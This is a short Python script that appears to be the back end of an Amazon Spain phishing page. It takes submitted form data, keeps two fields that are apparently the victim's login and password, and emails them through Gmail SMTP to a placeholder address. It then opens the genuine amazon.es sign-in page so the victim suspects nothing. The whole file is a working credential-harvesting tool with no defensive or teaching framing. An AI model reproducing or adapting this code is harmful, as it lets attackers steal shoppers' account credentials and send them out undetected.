from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import email
import sys
import webbrowser

try:
    datos = sys.argv[1].split("&")
    message = datos[-3] + "\n" + datos[-1]

except IndexError:
    message = sys.argv[1]


msg = MIMEMultipart()

msg['From'] = 'email from'
msg['To'] = 'email to'
password = "password email from"
msg['Subject'] = 'type here the subject'

# add in the message body
msg.attach(MIMEText(message, 'plain'))

#create server
server = smtplib.SMTP('smtp.gmail.com: 587')

server.starttls()

# Login Credentials for sending the mail
server.login(msg['From'], password)


# send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()


url="https://www.amazon.es/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=esflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.es%2F%3Fref_%3Dnav_custrec_signin&switch_account="
webbrowser.open(url, new=0, autoraise=False)
